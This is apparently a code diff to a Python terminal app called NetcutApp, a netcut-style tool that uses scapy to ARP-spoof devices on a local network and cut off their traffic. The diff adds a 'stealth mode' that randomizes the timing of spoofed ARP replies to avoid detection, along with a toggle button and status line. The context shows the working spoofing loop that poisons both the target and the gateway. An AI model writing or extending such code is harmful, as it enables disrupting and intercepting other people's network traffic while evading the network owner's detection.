@@ -53,6 +53,8 @@ DISCORD_RANGES = ["162.159.0.0/16", "173.245.48.0/20", "108.162.0.0/15", "104.16
 STEAM_RANGES = ["208.64.200.0/22", "208.78.164.0/22", "185.25.182.0/23"]
 custom_blocks = {}
 global_dns_block = False
+stealth_mode = False
+stealth_intervals = [1.5, 2.3, 1.8, 3.1, 2.7, 1.2, 2.9, 1.6]
 dns_server_thread = None
 dns_blocklist = set()
 _attacks_built = False
@@ -142,11 +144,12 @@ def arp_scan(subnet=None):
 
 def arp_spoof_loop(tip, tmac, gw, ev, block=True):
     mmac = scapy.get_if_hwaddr(iface)
+    import random as _r
     while ev.is_set() and not quit_flag:
         scapy.sendp(scapy.Ether(dst=tmac)/scapy.ARP(op=2,pdst=tip,psrc=gw,hwdst=tmac), verbose=False)
         if block:
             scapy.sendp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op=2,pdst=gw,psrc=tip,hwdst="ff:ff:ff:ff:ff:ff"), verbose=False)
-        time.sleep(1.5)
+        time.sleep(_r.choice(stealth_intervals) if stealth_mode else 1.5)
 
 def sniff_sites():
     seen = defaultdict(set)
@@ -404,6 +407,11 @@ class NetcutApp(App):
             if domain: self.unblock_domain(domain)
         elif btn_id == "global-dns-btn":
             self.toggle_global_dns()
+        elif btn_id == "stealth-btn":
+            global stealth_mode
+            stealth_mode = not stealth_mode
+            self.notify(f"Stealth mode {'ON' if stealth_mode else 'OFF'}", timeout=2)
+            self.build_attacks_tab()
         elif btn_id == "block-ip-btn":
             ip = self.query_one("#target-ip",Input).value.strip()
             mac = next((d["mac"] for d in devices if d["ip"]==ip), None)
@@ -689,6 +697,9 @@ class NetcutApp(App):
             pane.mount(Static("[bold]Global DNS Block[/]"))
             pane.mount(Horizontal(Button("Toggle Global DNS Block", id="global-dns-btn", variant="warning"), id="global-dns-row"))
             pane.mount(Static("", id="global-dns-status"))
+            pane.mount(Static("[bold]Stealth[/]"))
+            pane.mount(Horizontal(Button("Toggle Stealth Mode", id="stealth-btn", variant="default"), id="stealth-row"))
+            pane.mount(Static("", id="stealth-status"))
         except Exception as e:
             self.notify(f"Build: {e}", severity="error", timeout=10)
     
@@ -704,6 +715,8 @@ class NetcutApp(App):
             self.query_one("#domain-status", Static).update(status)
             gs = "[green]ACTIVE[/]" if global_dns_block else "[dim]OFF[/]"
             self.query_one("#global-dns-status", Static).update(f"Global DNS Block: {gs}")
+            ss = "[green]ON[/] (random ARP timing)" if stealth_mode else "[dim]OFF[/]"
+            self.query_one("#stealth-status", Static).update(f"Stealth: {ss}")
         except: pass
     
     def build_monitor_tab(self):
